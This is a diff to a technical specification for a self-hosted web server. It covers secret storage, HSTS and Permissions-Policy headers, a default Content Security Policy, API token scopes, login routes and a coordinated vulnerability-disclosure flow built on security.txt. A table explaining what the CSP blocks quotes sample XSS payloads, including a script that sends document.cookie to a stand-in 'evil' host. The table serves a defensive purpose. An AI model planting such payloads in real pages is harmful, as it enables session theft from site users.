+| Rotation | Manual via admin panel (`/{admin_path}/server/security/keypair` → "Rotate Installation Secret"). Sensitive-operation flow (PART 5 → "Sensitive Operations"): re-prompt admin password, log to `audit.log` as `security.installation_secret_rotated`. Rotation re-encrypts the PGP private key and re-bases all live HMACs. The previous secret is kept for 7 days to validate any in-flight `{security_id}` URLs that referenced it. |
+| Backup | Always — see PART 22 → "Backup Contents". Required for any restore: without it, the PGP private key in the backup is undecryptable. |
+| Loss = catastrophic | Lost = cannot decrypt PGP private key (and therefore cannot decrypt in-flight encrypted security reports); cannot validate `{security_id}` URLs on existing security.txt copies until the file regenerates. Recovery requires admin to: regenerate keypair, regenerate `installation_secret`, accept that all in-flight encrypted reports are unreadable. |
+
+### Other Project-Level Secrets
+
+| Secret | Length | Storage | Purpose | Rotation |
+|--------|--------|---------|---------|----------|
+| `cookie_signing_key` | 32 bytes (HMAC-SHA256) | `server.db` row `app_secrets.cookie_signing_key` | Signs session cookies to detect tampering. | Auto-rotated every 90 days; previous key valid for 7 days. |
+| `csrf_token_secret` | 32 bytes | `server.db` row `app_secrets.csrf_token_secret` | HMAC base for CSRF tokens (double-submit pattern, PART 16 → CSRF). | Auto-rotated on every admin password change + every 180 days. |
+
+**Pre-existing key (defined in PART 11 → "Server Encryption Key"):**
+
+| Key | Length | Storage | Purpose | Rotation |
+|-----|--------|---------|---------|----------|
+| `server.security.encryption_key` | 32 bytes (AES-256-GCM) | `server.yml` (auto-generated on first run) | At-rest encryption for ALL sensitive server data: 2FA secrets, security report bodies (used as the AES fallback when no PGP keypair exists or when an admin has no personal pubkey, see PART 11 → "Security Reports"), and any future at-rest encrypted data. | Manual via admin panel (sensitive-op flow). 30-day grace for in-flight encrypted data. |
+
+**Note on consolidation:** `server.security.encryption_key` is the canonical at-rest AES key — every place the spec talks about "encrypt this sensitive data at rest" resolves to this one key, including security report bodies. It is NOT duplicated in `app_secrets`. The four `app_secrets` rows above are HMAC keys (not AES) and a root-secret for HMAC derivation; they are stored in the DB rather than `server.yml` because they have independent rotation lifecycles and need to be visible to cluster replicas via shared DB read.
+
+**All secrets above:**
+- Generated on first start, before any user-visible operation.
+- NEVER returned in any API response — even to admins. The admin panel shows "configured" / "rotated 12 days ago" / fingerprint hashes only.
+- NEVER logged. The Output Sanitization Pipeline (PART 11 → above) treats any field whose name contains `secret`, `key`, `password`, `token` as redacted at the log layer too.
+- Always included in backups (PART 22 → "Backup Contents").
+- Restored verbatim from a backup. Restoring partially (e.g., DB without these secrets) is rejected by the restore flow — the manifest verifies all secrets are present.
+
 ## Security Headers
 
 **All responses MUST include:**
@@ -13741,22 +14475,229 @@ X-Content-Type-Options: nosniff
 X-Frame-Options: SAMEORIGIN
 X-XSS-Protection: 1; mode=block
 Referrer-Policy: strict-origin-when-cross-origin
-Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'
-Permissions-Policy: geolocation=(), microphone=(), camera=()
+Content-Security-Policy: <see "Content Security Policy" below>
+Permissions-Policy: <generated from web.permissions_policy config — see "Permissions-Policy Configuration" below>
+Report-To: {"group":"default","max_age":10886400,"endpoints":[{"url":"https://{fqdn}/api/{api_version}/server/reports/default"}]}
 ```
 
-**When SSL is enabled, also include:**
+**When SSL is enabled, also include (HSTS — RFC 6797):**
 
 ```
-Strict-Transport-Security: max-age=31536000; includeSubDomains
+Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
 ```
 
 **Notes:**
 - `X-XSS-Protection` is deprecated in modern browsers but kept for older browser compatibility
-- `'unsafe-inline'` in CSP is required for many frameworks; tighten if your app allows
-- HSTS `max-age` is configurable (default 1 year = 31536000 seconds)
+- HSTS — RFC 6797. Default `max-age=63072000` (2 years) per the HSTS Preload List requirement (`hstspreload.org`). `includeSubDomains` and `preload` directives included by default.
+- **`preload` is an opt-out commitment.** Once a domain is on the public preload list (built into Chrome/Firefox/Safari/Edge), removal can take 6-12 months even after disabling. Operator MAY disable preload via `web.hsts.preload: false` if the site is not yet ready (no SSL on every subdomain, etc.). Default ON because zero-config secure means committing to TLS forever.
+- `web.hsts.max_age_seconds` is configurable; values <31536000 (1 year) make the site preload-ineligible. Setting to 0 disables HSTS entirely for emergencies — produces a warning at startup.
+- Permissions-Policy is **fully configurable per project** — see "Permissions-Policy Configuration" below. Defaults strike a balance: features required by the spec itself (WebAuthn, fullscreen, payment, picture-in-picture, encrypted-media, web-share, autoplay, storage-access) are scoped to `self`; advertising-tracking proposals (`interest-cohort`, `browsing-topics`, `attribution-reporting`) are disabled; everything else (camera, microphone, geolocation, USB, MIDI, sensors, screen capture, etc.) is **disabled by default but trivially enable-able** by the project's `IDEA.md` declaring which features it uses. A mapping app, video chat, voice notes, and similar projects flip a single config key per feature and the header updates automatically.
 
-**In development mode, these may be relaxed.**
+### Permissions-Policy Configuration
+
+```yaml
+web:
+  permissions_policy:
+    # Each key is a Permissions-Policy feature. Value is one of:
+    #   "()"             - block for everyone (locked-down default)
+    #   "(self)"         - allow same-origin only (typical for app's own use)
+    #   "(self https://embedded.example.com)" - allow self + specific origins
+    #   "*"              - allow all origins (use rarely; consider security implications)
+    #
+    # Spec-default-locked features (project enables only what its IDEA.md declares):
+    accelerometer: "()"
+    ambient-light-sensor: "()"
+    battery: "()"
+    camera: "()"            # mapping/video-chat/voice projects: set to "(self)"
+    display-capture: "()"   # screen-share projects: set to "(self)"
+    geolocation: "()"       # location-aware projects: set to "(self)"
+    gyroscope: "()"
+    hid: "()"
+    idle-detection: "()"
+    magnetometer: "()"
+    microphone: "()"        # voice/video projects: set to "(self)"
+    midi: "()"
+    screen-wake-lock: "()"
+    serial: "()"
+    usb: "()"
+    xr-spatial-tracking: "()"
+
+    # Advertising / tracking proposals — disabled by default, regardless of project.
+    # The spec's privacy posture (PART 11 → "Public Endpoint Safety Principle") forbids
+    # these even if a project's IDEA.md asks for them. Operator can override but the
+    # admin panel surfaces a privacy warning.
+    attribution-reporting: "()"
+    browsing-topics: "()"
+    interest-cohort: "()"
+
+    # Features the spec itself uses — scoped to self by default.
+    autoplay: "(self)"
+    encrypted-media: "(self)"
+    fullscreen: "(self)"
+    payment: "(self)"
+    picture-in-picture: "(self)"
+    publickey-credentials-get: "(self)"   # WebAuthn / Passkeys
+    storage-access: "(self)"
+    web-share: "(self)"
+```
+
+**Generation rule:** the binary builds the `Permissions-Policy` header at startup by joining the keys above into a single `feature1=value1, feature2=value2, …` string. Empty values (`""`) skip the feature entirely (header omits it — browser default applies). Unknown feature names (browser doesn't support yet) are emitted anyway — non-supporting browsers ignore them harmlessly.
+
+**`IDEA.md`-driven enablement:** when a project's `IDEA.md` declares a feature like `"uses_geolocation": true`, the binary's first-run setup pre-fills `geolocation: "(self)"` in `server.yml` so the operator doesn't have to flip the flag manually. Same for camera, microphone, display-capture, etc.
+
+**In development mode, headers are issued unchanged — but CSP runs in `Content-Security-Policy-Report-Only` mode (see below) so violations are logged without breaking the app.**
+
+### Security Header Config
+
+```yaml
+web:
+  hsts:
+    enabled: true                      # default true. Set false only for HTTP-only deployments.
+    max_age_seconds: 63072000          # default 2 years (preload-list eligible).
+    include_subdomains: true           # default true.
+    preload: true                      # default true. See HSTS preload caveat above.
+
+  permissions_policy:
+    # Per-feature config — see "Permissions-Policy Configuration" below.
+
+  reports:
+    # Public reports endpoints (PART 14 → "Public Reports Scope").
+    rate_limit_per_minute: 60          # max reports/min/IP across all report types
+    rate_limit_per_ip_burst: 10        # short-burst allowance
+
+  csrf:
+    # See "CSRF Protection" below for full schema.
+
+  csp:
+    # See "Content Security Policy" below for full schema.
+
+  cors:
+    # See PART 16 → CORS for full schema.
+```
+
+## Content Security Policy
+
+**Goal: same as CORS — "just works" out of the box for typical apps (CDN images, web fonts, embedded videos, third-party widgets) without operator config, while still blocking the obvious XSS vectors. Operator can tighten or extend per-directive.**
+
+### Default Policy (per-directive)
+
+```
+default-src 'self';
+script-src 'self' 'unsafe-inline';
+style-src 'self' 'unsafe-inline';
+img-src 'self' data: blob: https:;
+font-src 'self' https:;
+connect-src 'self' {learned_origins};
+media-src 'self' blob:;
+worker-src 'self' blob:;
+manifest-src 'self';
+frame-src 'self';
+frame-ancestors 'self';
+base-uri 'self';
+form-action 'self';
+object-src 'none';
+upgrade-insecure-requests;
+report-to default;
+report-uri /api/{api_version}/server/reports/csp
+```
+
+**Why this default — per directive:**
+
+| Directive | Default | Reason |
+|-----------|---------|--------|
+| `default-src` | `'self'` | Strict baseline; all unset directives fall back here. |
+| `script-src` | `'self' 'unsafe-inline'` | `'unsafe-inline'` is the pragmatic compromise — most templates inline small scripts (analytics opt-in, theme bootstrap). Tighten with nonces if your app generates them; see "Tightening to nonce-based CSP" below. |
+| `style-src` | `'self' 'unsafe-inline'` | Inline `style=""` attributes and `<style>` blocks are unavoidable in many templates and component frameworks. |
+| `img-src` | `'self' data: blob: https:` | `data:` for inline icons/SVG, `blob:` for client-side generated previews, `https:` so user avatars / CDN images / OG embeds work without per-host config. (HTTP images explicitly excluded — TLS only.) |
+| `font-src` | `'self' https:` | Web fonts (Google Fonts, FontAwesome CDN, custom CDNs) work without per-host config. HTTPS only. |
+| `connect-src` | `'self' {learned_origins}` | XHR/fetch/EventSource/WebSocket. `{learned_origins}` = DOMAIN env entries + reverse-proxy-detected hosts (same source as CORS — see PART 16 → "CORS Allow-list Resolution Order"). |
+| `media-src` | `'self' blob:` | `<video>`/`<audio>` from own host + client-generated streams (recording, MediaSource API). |
+| `worker-src` | `'self' blob:` | Service workers (PWA), web workers, including blob-instantiated workers. |
+| `manifest-src` | `'self'` | PWA manifest must come from the app's own host. |
+| `frame-src` | `'self'` | iframes from own host only by default. Operator extends for YouTube/Vimeo/Stripe via `csp.frame_src_extra` (see config below). |
+| `frame-ancestors` | `'self'` | Modern replacement for `X-Frame-Options: SAMEORIGIN`. Both headers stay set for legacy browser compatibility. |
+| `base-uri` | `'self'` | Prevents `<base>` tag injection redirecting relative URLs. |
+| `form-action` | `'self'` | Forms can only submit back to the app. Operator extends for OAuth providers via `csp.form_action_extra`. |
+| `object-src` | `'none'` | Blocks `<object>`, `<embed>`, `<applet>` — legacy plugin attack surface. |
+| `upgrade-insecure-requests` | enabled | Browsers auto-upgrade `http://` references to `https://` when SSL is on, eliminating mixed-content warnings. |
+| `report-to` | `default` group | Modern Reporting API. Group definition is in the `Report-To` header above. |
+| `report-uri` | `/api/{api_version}/server/reports/csp` | Legacy CSP-report fallback for browsers that don't support `report-to` yet. |
+
+### Configuration (per-directive append)
+
+```yaml
+web:
+  csp:
+    enabled: true                     # default: true
+    mode: enforce                     # enforce | report-only
+    # Per-directive append — these strings are added to the default value.
+    # Operator never has to redefine the whole policy.
+    script_src_extra: ""              # e.g. "https://js.stripe.com https://www.google.com/recaptcha/"
+    style_src_extra: ""               # e.g. "https://fonts.googleapis.com"
+    img_src_extra: ""                 # rarely needed — default already covers https:
+    font_src_extra: ""                # rarely needed — default already covers https:
+    connect_src_extra: ""             # e.g. "https://api.stripe.com wss://realtime.example.com"
+    frame_src_extra: ""               # e.g. "https://www.youtube.com https://player.vimeo.com https://js.stripe.com"
+    form_action_extra: ""             # e.g. "https://accounts.google.com" for OAuth submit
+    # Override-style: REPLACE the directive instead of appending. Use sparingly.
+    script_src_override: ""
+    # ... (mirror for every directive)
+    # Reporting
+    reports_enabled: true             # POST violations to /api/{api_version}/server/reports/csp
+    reports_sample_rate: 1.0          # 0.0 .. 1.0 — sample to control volume on busy sites
+```
+
+**Auto-detection:** `connect-src`, `frame-ancestors`, and `form-action` automatically pick up DOMAIN env entries and reverse-proxy-detected hosts (same resolution order as CORS — see PART 16). Operator does NOT have to list their own domain in `connect_src_extra`.
+
+### Report-Only Mode
+
+```yaml
+web:
+  csp:
+    mode: report-only
+```
+
+Sends `Content-Security-Policy-Report-Only` instead of the enforcing header. Violations are logged + POSTed to the report endpoint, but nothing is blocked. Useful when:
+- Rolling out a tightened policy gradually
+- Debugging a third-party widget that violates the default
+- Development mode (auto-applied unless `mode: enforce` set explicitly)
+
+### Reports Endpoint
+
+**See PART 14 → "Public Reports Scope" for the canonical reports endpoint pattern (`/api/{api_version}/server/reports/{name}`). All browser-emitted reports — CSP, NEL, deprecation, intervention, crash, default — share the same scope and shape.**
+
+Server-side handling:
+- Accept `application/csp-report` (legacy) and `application/reports+json` (Reporting API)
+- Log to `security.log` as `security.csp_violation` (see PART 11 → security log events)
+- Rate-limit per-IP to prevent flooding
+- Respond `204 No Content` to keep the browser happy
+- NEVER return user-controlled fields back in the response body
+
+### Tightening to nonce-based CSP
+
+For deployments that can generate per-request nonces (most Go template setups can), drop `'unsafe-inline'` from `script-src`/`style-src` and use:
+
+```yaml
+web:
+  csp:
+    script_src_override: "'self' 'nonce-{request_nonce}' 'strict-dynamic'"
+    style_src_override:  "'self' 'nonce-{request_nonce}'"
+```
+
+The middleware substitutes `{request_nonce}` per response and adds the same nonce to every server-rendered `<script>` and `<style>` tag. Inline scripts the operator hasn't authored (third-party widgets) get blocked unless their hash is added.
+
+### What CSP Stops, What It Doesn't
+
+| Attack | Default policy stops it? |
+|--------|--------------------------|
+| Stored XSS injecting `<script src="https://evil.example/...">` | ✓ Yes (script-src `'self'` blocks the cross-origin load) |
+| Stored XSS injecting `<script>fetch('//evil/?'+document.cookie)</script>` | ✗ No with default (`'unsafe-inline'`); ✓ Yes with nonce-based override |
+| Clickjacking via `<iframe src="https://victim/...">` | ✓ Yes (frame-ancestors `'self'`) |
+| `<base href="https://evil/">` redirecting all relative URLs | ✓ Yes (base-uri `'self'`) |
+| Form-action hijack to `https://evil/login` | ✓ Yes (form-action `'self'`) |
+| Mixed-content `http://` references | ✓ Yes (upgrade-insecure-requests when SSL on) |
+| Stolen session cookie replay | ✗ No (CSP can't help — session/CSRF problem) |
+| Server-side template injection | ✗ No (CSP runs in the browser; SSTI is server-side) |
 
 ## API Token Security
 
@@ -13785,6 +14726,7 @@ Agent tokens (scoped to owner):
 | `adm_` | Admin token | **YES - all projects** | Server admin API access |
 | `usr_` | User token | If multi-user (PART 34) | Regular user API access |
 | `org_` | Organization token | If orgs (PART 35) | Organization-level API access |
+| `sec_` | Security report tracking ID | **YES - all projects** | Researcher status URL token (PART 11 → "Security Reports"). NOT a bearer token — used as a per-report identifier in `/server/security/report/{tracking_id}` URLs. Issued at report submission, expires 30 days after report closes. |
 
 ### Token Properties
 
@@ -13817,9 +14759,9 @@ adm_ghi789...  "monitoring"   read       1 year
 
 | Prefix | Scope | Route | Description |
 |--------|-------|-------|-------------|
-| `adm_agt_` | Admin | `/api/v1/admin/server/agents/*` | Server infrastructure agents |
-| `usr_agt_` | User | `/api/v1/users/agents/*` | User's personal agents (SaaS) |
-| `org_agt_` | Org | `/api/v1/orgs/{slug}/agents/*` | Organization agents |
+| `adm_agt_` | Admin | `/api/{api_version}/{admin_path}/server/agents/*` | Server infrastructure agents |
+| `usr_agt_` | User | `/api/{api_version}/users/agents/*` | User's personal agents (SaaS) |
+| `org_agt_` | Org | `/api/{api_version}/orgs/{slug}/agents/*` | Organization agents |
 
 **Same setup procedure across all scopes** - one-line config, same registration flow.
 
@@ -13939,14 +14881,14 @@ func validateAgentToken(token string, scope TokenScope) (*TokenInfo, error) {
 
 | Token Type | Allowed Routes | Description |
 |------------|----------------|-------------|
-| `adm_` | `/api/v1/admin/*` | Server admin panel |
-| `adm_` | `/api/v1/admin/server/*` | Server settings (within admin) |
-| `usr_` | `/api/v1/users/*`, `/api/v1/orgs/{allowed}/*` | User + orgs they belong to |
-| `org_` | `/api/v1/orgs/{specific}/*` | Single org only |
-| `adm_agt_` | `/api/v1/admin/server/agents/*` | Admin infrastructure agent |
-| `usr_agt_` | `/api/v1/users/agents/*` | User's personal agent |
-| `org_agt_` | `/api/v1/orgs/{slug}/agents/*` | Organization agent |
-| (no token) | `/api/v1/`, `/api/v1/server/*`, `/api/v1/{resource}/*` | Public routes (no auth) |
+| `adm_` | `/api/{api_version}/{admin_path}/*` | Server admin panel |
+| `adm_` | `/api/{api_version}/{admin_path}/server/*` | Server settings (within admin) |
+| `usr_` | `/api/{api_version}/users/*`, `/api/{api_version}/orgs/{allowed}/*` | User + orgs they belong to |
+| `org_` | `/api/{api_version}/orgs/{specific}/*` | Single org only |
+| `adm_agt_` | `/api/{api_version}/{admin_path}/server/agents/*` | Admin infrastructure agent |
+| `usr_agt_` | `/api/{api_version}/users/agents/*` | User's personal agent |
+| `org_agt_` | `/api/{api_version}/orgs/{slug}/agents/*` | Organization agent |
+| (no token) | `/api/{api_version}/`, `/api/{api_version}/server/*`, `/api/{api_version}/{resource}/*` | Public routes (no auth) |
 
 **Context Types:**
 
@@ -13955,14 +14897,14 @@ type TargetType int
 
 const (
     TargetUnknown       TargetType = iota // Unknown/invalid target
-    TargetPublic                          // Public routes (/, /api/v1/, project-specific like /jokes, /weather, /ip)
-    TargetServerPages                     // Server pages - about, help, contact, privacy (/server/*, /api/v1/server/*)
-    TargetAuth                            // Auth flows (/auth/*, /api/v1/auth/*)
-    TargetCurrentUser                     // Current user from token (/users/*, /api/v1/users/*)
-    TargetUser                            // Specific user (/users/{username}/*, /api/v1/users/{username}/*)
-    TargetOrg                             // Organization (/orgs/{slug}/*, /api/v1/orgs/{slug}/*)
-    TargetAdmin                           // Server admin panel (/admin/*, /api/v1/admin/*)
-    TargetAdminServer                     // Server settings within admin (/admin/server/*, /api/v1/admin/server/*)
+    TargetPublic                          // Public routes (/, /api/{api_version}/, project-specific like /jokes, /weather, /ip)
+    TargetServerPages                     // Server pages - about, help, contact, privacy (/server/*, /api/{api_version}/server/*)
+    TargetAuth                            // Auth flows (/auth/*, /api/{api_version}/auth/*)
+    TargetCurrentUser                     // Current user from token (/users/*, /api/{api_version}/users/*)
+    TargetUser                            // Specific user (/users/{user_name}/*, /api/{api_version}/users/{user_name}/*)
+    TargetOrg                             // Organization (/orgs/{slug}/*, /api/{api_version}/orgs/{slug}/*)
+    TargetAdmin                           // Server admin panel (/{admin_path}/*, /api/{api_version}/{admin_path}/*)
+    TargetAdminServer                     // Server settings within admin (/{admin_path}/server/*, /api/{api_version}/{admin_path}/server/*)
 )
 ```
 
@@ -14000,66 +14942,66 @@ func ContextMiddleware(next http.Handler) http.Handler {
 
 // extractContextFromPath determines context from URL path
 func extractContextFromPath(path string) (*Context, error) {
-    // /api/v1/ → Public (project root)
-    // /api/v1/server/* → Server Pages (about, help, contact, privacy)
-    // /api/v1/auth/* → Auth flows
-    // /api/v1/users/* → User context (current user or {username})
-    // /api/v1/orgs/{slug}/* → Org context
-    // /api/v1/admin/* → Server Admin
-    // /api/v1/admin/server/* → Server Settings (within admin)
-    // /api/v1/{resource}/* → Public routes (project-specific: jokes, weather, ip, etc.)
+    // /api/{api_version}/ → Public (project root)
+    // /api/{api_version}/server/* → Server Pages (about, help, contact, privacy)
+    // /api/{api_version}/auth/* → Auth flows
+    // /api/{api_version}/users/* → User context (current user or {user_name})
+    // /api/{api_version}/orgs/{slug}/* → Org context
+    // /api/{api_version}/{admin_path}/* → Server Admin
+    // /api/{api_version}/{admin_path}/server/* → Server Settings (within admin)
+    // /api/{api_version}/{resource}/* → Public routes (project-specific: jokes, weather, ip, etc.)
 
-    apiBase := APIBasePath() + "/" // e.g., "/api/v1/"
+    apiBase := APIBasePath() + "/" // e.g., "/api/{api_version}/"
     parts := strings.Split(strings.TrimPrefix(path, apiBase), "/")
     if len(parts) == 0 {
         return &Context{Type: TargetPublic}, nil
     }
 
     switch parts[0] {
-    case "": // Root /api/v1/
+    case "": // Root /api/{api_version}/
         return &Context{Type: TargetPublic}, nil
     case "server":
-        // /api/v1/server/* - public server pages (about, help, contact, privacy)
+        // /api/{api_version}/server/* - public server pages (about, help, contact, privacy)
         return &Context{Type: TargetServerPages}, nil
     case "auth":
-        // /api/v1/auth/* - authentication flows (public)
+        // /api/{api_version}/auth/* - authentication flows (public)
         return &Context{Type: TargetAuth}, nil
     case "users":
         if len(parts) > 1 && parts[1] != "" {
-            // /api/v1/users/{username}/* - specific user
+            // /api/{api_version}/users/{user_name}/* - specific user
             return &Context{Name: parts[1], Type: TargetUser}, nil
         }
-        // /api/v1/users/* - current user (from token)
+        // /api/{api_version}/users/* - current user (from token)
         return &Context{Type: TargetCurrentUser}, nil
     case "orgs":
         if len(parts) < 2 || parts[1] == "" {
             return nil, ErrMissingOrgSlug
         }
-        // /api/v1/orgs/{slug}/*
+        // /api/{api_version}/orgs/{slug}/*
         return &Context{Name: parts[1], Type: TargetOrg}, nil
     case cfg.AdminPath: // Configurable admin path
         // Check for server settings within admin
         if len(parts) > 1 && parts[1] == "server" {
-            // /api/v1/admin/server/* - server settings
+            // /api/{api_version}/{admin_path}/server/* - server settings
             return &Context{Type: TargetAdminServer}, nil
         }
-        // /api/v1/admin/* - admin panel
+        // /api/{api_version}/{admin_path}/* - admin panel
         return &Context{Type: TargetAdmin}, nil
     default:
-        // Project-specific public routes (e.g., /api/v1/jokes, /weather, /ip)
+        // Project-specific public routes (e.g., /api/{api_version}/jokes, /weather, /ip)
         return &Context{Type: TargetPublic}, nil
     }
 }
 ```
 
-**Error responses:**
+**Error responses (canonical shape from PART 16 → "Error Response"):**
 
-| Scenario | HTTP Status | Error |
-|----------|-------------|-------|
-| Invalid path format | 400 | `{"error": "invalid API path"}` |
-| Missing org slug | 400 | `{"error": "org slug required in path"}` |
-| Resource not found | 404 | `{"error": "user or org not found: xyz"}` |
-| No access to resource | 403 | `{"error": "no access to requested resource"}` |
+| Scenario | HTTP Status | Body |
+|----------|-------------|------|
+| Invalid path format | 400 | `{"ok": false, "error": "BAD_REQUEST", "message": "invalid API path"}` |
+| Missing org slug | 400 | `{"ok": false, "error": "BAD_REQUEST", "message": "org slug required in path"}` |
+| Resource not found | 404 | `{"ok": false, "error": "NOT_FOUND", "message": "user or org not found: xyz"}` |
+| No access to resource | 403 | `{"ok": false, "error": "FORBIDDEN", "message": "no access to requested resource"}` |
 
 **API response includes context:**
 
@@ -14081,21 +15023,21 @@ func extractContextFromPath(path string) (*Context, error) {
 
 **Required Routes (all projects):**
 
-| Route | Method | Purpose |
-|-------|--------|---------|
-| `/auth/login` | GET | Login form (handles both admin and user) |
-| `/auth/login` | POST | Process login, redirect based on account type |
-| `/auth/logout` | GET/POST | End session |
-| `/auth/password/reset` | GET/POST | Password reset (if SMTP) |
-| `/auth/invite/server/{code}` | GET | Admin invite acceptance |
+| Route | Method | Auth | Purpose |
+|-------|--------|------|---------|
+| `/auth/login` | GET | None | Login form (handles both admin and user) |
+| `/auth/login` | POST | None | Process login, redirect based on account type |
+| `/auth/logout` | GET/POST | Session | End session |
+| `/auth/password/reset` | GET/POST | Reset token | Password reset (if SMTP) |
+| `/auth/invite/server/{code}` | GET | Invite token | Admin invite acceptance |
 
 **Additional routes if multi-user (PART 34):**
 
-| Route | Method | Purpose |
-|-------|--------|---------|
-| `/auth/register` | GET/POST | User registration |
-| `/auth/verify/{code}` | GET | Email verification |
-| `/auth/invite/user/{code}` | GET | User invite acceptance |
+| Route | Method | Auth | Purpose |
+|-------|--------|------|---------|
+| `/auth/register` | GET/POST | None | User registration |
+| `/auth/verify/{code}` | GET | Verify token | Email verification |
+| `/auth/invite/user/{code}` | GET | Invite token | User invite acceptance |
 
 ### Scoped Login Redirect 
 
@@ -14103,7 +15045,7 @@ func extractContextFromPath(path string) (*Context, error) {
 
 | Account Type | Stored In | After Login Redirect |
 |--------------|-----------|---------------------|
-| **Server Admin** | `admins` table | `/admin` (default: `/admin`) |
+| **Server Admin** | `admins` table | `/{admin_path}` (default: `/admin`) |
 | **Regular User** | `users` table | `/users` or `?redirect=` param |
 
 **Login Flow:**
@@ -14122,7 +15064,7 @@ Set admin_session    Check `users` table (if multi-user)
     │                    │
     ↓               ┌─── Match found? ───┐
 Redirect to         │                    │
-/admin      YES                   NO
+/{admin_path}      YES                   NO
                     │                    │
                     ↓                    ↓
                Set user_session    Return error:
@@ -14198,30 +15140,172 @@ web:
 
 ### security.txt (RFC 9116)
 
-**ALL projects MUST serve a valid security.txt file.**
+**ALL projects MUST serve a valid security.txt file. The file is the entry point of the project's coordinated-disclosure workflow — it points researchers at a one-shot contact URL with a rotating ID, the project's PGP key, the disclosure policy, and the acknowledgments page.**
 
 ```
 # Served at /.well-known/security.txt
 
+Contact: https://{fqdn}/server/contact?security_id={current_security_id}
 Contact: mailto:{security_contact}
+Encryption: https://{fqdn}/.well-known/pgp-key.asc
+Policy: https://{fqdn}/server/security/policy
+Acknowledgments: https://{fqdn}/server/security/thanks
+Canonical: https://{fqdn}/.well-known/security.txt
+Preferred-Languages: en
 Expires: {expiry_date}
 ```
 
 **Configuration:**
+
+The recipient address comes from `server.contact.security.email` (PART 12 → "Contact Configuration"). Everything below tunes how `security.txt` is generated; recipient routing is centralized in `server.contact`.
+
 ```yaml
 web:
   security:
-    contact: "security@wthr.top"    # Security contact email
-    expires: "{1year}"            # Auto-calculated 1 year from generation
+    expires: "{1year}"                   # Auto-calculated 1 year from generation; auto-renewed.
+    preferred_languages: "en"            # Comma-separated BCP-47 codes.
+    publish_pgp_key: true                # Serve /.well-known/pgp-key.asc when keypair exists.
+    keyserver_publish: true              # On keypair generation/rotation, push pubkey to configured keyservers.
+    keyservers:
+      - keys.openpgp.org
+      - keyserver.ubuntu.com
+    coordinated_disclosure_days: 90      # Default disclosure window suggested in the policy page.
 ```
 
-**Fields:**
+**Fields (all auto-generated, no manual edit):**
+
 | Field | Required | Description |
 |-------|----------|-------------|
-| `Contact` | YES | Email for reporting vulnerabilities (mailto: prefix added automatically) |
-| `Expires` | YES | Expiration date (auto-renewed yearly by default) |
+| `Contact` (security_id URL) | YES | Rotating per-48h URL pointing at `/server/contact?security_id={current_security_id}`. The form switches to security-report mode when the ID matches the current or previous window — see "Security Reports" below. |
+| `Contact` (mailto fallback) | YES | `security@{fqdn}` for researchers who prefer email / PGP-only flow. |
+| `Encryption` | If keypair exists | URL to project PGP public key (`/.well-known/pgp-key.asc`). Generated and managed via the admin panel — see "GPG Keypair Management" below. |
+| `Policy` | YES | Link to the disclosure policy page (`/server/security/policy`). |
+| `Acknowledgments` | If enabled | Link to the public hall-of-fame (`/server/security/thanks`). Researchers opt in per submission. |
+| `Canonical` | YES | RFC 9116 — pin which URL is the authoritative version of this file. |
+| `Preferred-Languages` | YES | Helps researchers in multilingual deployments file in a language the maintainers can read. |
+| `Expires` | YES | Expiration date (auto-renewed yearly by default). |
 
-### Admin Panel (/admin/web)
+## Security Reports — Coordinated Disclosure Pipeline
+
+**End-to-end flow for a security researcher reporting a vulnerability, integrated with the existing `/server/contact` form so researchers don't need to learn a new submission system.**
+
+### `{security_id}` — Rotating One-Shot Token
+
+| Property | Detail |
+|----------|--------|
+| Algorithm | `HMAC-SHA256(installation_secret, floor(unix_seconds / 172800))` → hex-encode → first 16 chars |
+| Rotation | Every 48 hours (172800 seconds) |
+| Validation window | Server accepts the **current** AND **previous** 48h window's id — prevents boundary failures for researchers who load the security.txt at second 47:59:59 |
+| Where it appears | Only in `/.well-known/security.txt` `Contact:` line. NEVER logged, NEVER returned in any other response. |
+| Failure mode | Invalid / expired id → form silently falls back to normal contact mode. Log to `security.log` as `security.security_id_invalid` (IP, user-agent, supplied id) — useful for catching scrape attempts. |
+| Why HMAC, not random | Determinism — each replica of the cluster computes the same id without coordinating state. The `installation_secret` (cluster-wide, persisted) is the only secret required. |
+
+### `/server/contact?security_id={id}` — Mode Switch
+
+| Mode | Triggered when | Form changes |
+|------|----------------|--------------|
+| Standard contact | No `security_id`, OR id present but invalid | Standard fields (Name, Email, Subject, Message, Captcha) — see PART 17 → `/server/contact`. |
+| Security report | `security_id` present AND matches current or previous 48h window | Security-research fields appended; submission routes to the security pipeline; tracking id issued. |
+
+**Security-mode form fields (in addition to Name + Email + Captcha):**
+
+| Field | Type | Required | Notes |
+|-------|------|----------|-------|
+| Researcher GPG | URL OR pasted pubkey block | Optional | If supplied, server validates the key and uses it for the acknowledgment email. URL form: any `https://`, including keyservers (`https://keys.openpgp.org/vks/v1/by-fingerprint/...`). |
+| Affected component | Dropdown OR free text | Yes | Dropdown populated from project's `IDEA.md` features (auth, API, frontend, admin, etc.); "Other" allows free text. |
+| Affected endpoint / URL | Text | Optional | The exact URL or path where the issue surfaces. |
+| Severity (researcher's self-assessment) | Critical / High / Medium / Low / Informational | Yes | Maintainers re-triage; this is the researcher's expectation. |
+| Vulnerability summary | Text (single line) | Yes | Used as the email subject and tracker entry title. |
+| Steps to reproduce | Markdown textarea | Yes | Maintainers need this to confirm. |
+| Impact | Markdown textarea | Yes | What an attacker could achieve. |
+| Suggested fix | Markdown textarea | Optional | Maintainers credit researcher more easily when a fix is proposed. |
+| CVE requested? | Checkbox | Optional | If yes, maintainers initiate CVE assignment after triage. |
+| Disclosure timeline preference | Number of days (default 90) | Optional | Researcher's preferred coordinated-disclosure window. Maintainers may negotiate. |
+| Credit preference | Yes (real name) / Yes (handle) / No / Anonymous | Yes | Drives `/server/security/thanks` listing on disclosure. |
+| Coordinated disclosure agreement | Checkbox | Yes | Researcher agrees to coordinated disclosure (no public release until coordinated date or 90 days, whichever first). |
+| Hidden auto-filled | — | — | `app_version`, `commit_hash`, `security_id`, `timestamp`, `request_user_agent`. Used for triage; never shown to researcher. |
+
+### Submission Flow (POST `/api/{api_version}/server/contact` with `security_id` set)
+
+1. Server re-validates the `security_id` server-side (form value can be tampered with).
+2. Allocates a `tracking_id` — `sec_` prefix + 16 random hex chars. Stored in the security-reports table.
